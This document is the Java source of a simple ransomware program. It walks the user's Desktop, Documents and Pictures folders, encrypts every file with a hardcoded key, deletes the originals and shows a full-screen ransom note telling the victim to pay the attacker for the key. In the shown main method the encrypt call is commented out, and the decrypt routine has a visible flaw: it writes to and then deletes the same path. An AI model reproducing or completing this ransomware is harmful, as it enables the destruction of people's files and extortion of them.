package com.company;

import org.apache.commons.io.FileUtils;
import java.io.*;
import java.util.*;
import java.awt.*;
import java.awt.event.*;
import java.util.List;
import javax.swing.*;


public class Main {

    static JFrame f;
    static JLabel l;

    public enum OS {
        WINDOWS,LINUX,MAC,SOLARIS
    };

    private static OS os = null;

    public static String key = "QfTjWmZq4t7w!z%C";

    public static void main(String[] args) {
	// write your code here
        FileFinder(true);
        // Encryptor( "");
        Warning();
        // Decryptor();
    }

    public static void FileFinder(boolean state){

        switch (getOs()) {
            case WINDOWS:
                // Look for windows sensitive paths in victim machine
            case LINUX:
                // Linux paths
            case MAC:
                // Mac paths
        }

        List<String> CriticalPathList = new ArrayList<String>();
        // Add sensitive directories to the List

        CriticalPathList.add((System.getProperty("user.home") + "/Desktop"));
        CriticalPathList.add((System.getProperty("user.home") + "/Documents"));
        CriticalPathList.add((System.getProperty("user.home") + "/Pictures"));

        for(String TargetDirectory:CriticalPathList) {
            File root = new File( TargetDirectory );

            try{
                String[] extensions = {""};
                Collection files = FileUtils.listFiles(root, extensions, true);

                for ( Object o: files) {
                    File file = (File) o;
                    // Return files to encryptor module
                    if(state == false) {
                        Encryptor(file.getAbsolutePath());
                    } else {
                        Decryptor(file.getAbsolutePath());
                    }

                }
            }catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    public static void Encryptor(String TargetFilePath){

        File targetFile = new File(TargetFilePath);
        File encryptedTargetFile = new File(TargetFilePath + ".encrypted");

        try{
            CryptoUtils.encrypt(key, targetFile,encryptedTargetFile);

        } catch (CryptoException ex) {
            ex.printStackTrace();
        }

        targetFile.delete();
    }

    public static void Warning(){
        f = new JFrame("Warning");
        l = new JLabel("Warning: All your Important files are Encrypted, Contact the attacker for payment to get your decryption key");

        JPanel p = new JPanel();
        p.add(l);
        f.add(p);

        //-- Input key for restoring files

        JPanel panel = new JPanel();
        JLabel label = new JLabel("Enter key : ");
        JTextField tf = new JTextField(32);

        JButton submit = new JButton("Restore Files");
        submit.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {

                String strVictimKey = tf.getText();

                if(strVictimKey.equalsIgnoreCase(key)){
                    // cmp- helps to neutralize ransomware
                    JOptionPane.showMessageDialog(f,"Correct key, Files Are Now Being Decrypted.");
                    FileFinder(true);
                } else {
                    JOptionPane.showMessageDialog(f,"Incorrect Key Entered.");
                }
            }
        });



        JButton reset = new JButton("Reset");

        panel.add(label);
        panel.add(tf);
        panel.add(submit);
        panel.add(reset);

        f.getContentPane().add(BorderLayout.NORTH, label);
        f.getContentPane().add(BorderLayout.SOUTH, panel);
        f.setExtendedState(JFrame.MAXIMIZED_BOTH);
        f.setUndecorated(true);
        f.setVisible(true);
    }

    public static void Decryptor(String EncryptedFilePath){
        File targetFile=new File(EncryptedFilePath); // private.txt.encrypted
        File decryptedTargetFile=new File(EncryptedFilePath); // private.txt

        try {

            CryptoUtils.decrypt(key,targetFile,decryptedTargetFile);


        }catch (CryptoException ex){

            ex.printStackTrace();
        }


        targetFile.delete();

    }

    public static OS getOs(){
        if(os == null) {

            String operSys = System.getProperty("os.name").toLowerCase(Locale.ROOT);

            if(operSys.contains("win")){
                os = OS.WINDOWS ;
            } else if (operSys.contains("nix") || operSys.contains("nux") || operSys.contains("aix")) {
                os = OS.LINUX;
            } else if(operSys.contains("mac")) {
                os = OS.MAC;
            } else if(operSys.contains("sunos")) {
                os=OS.SOLARIS;
            }
        }

        return  os;
    }
}
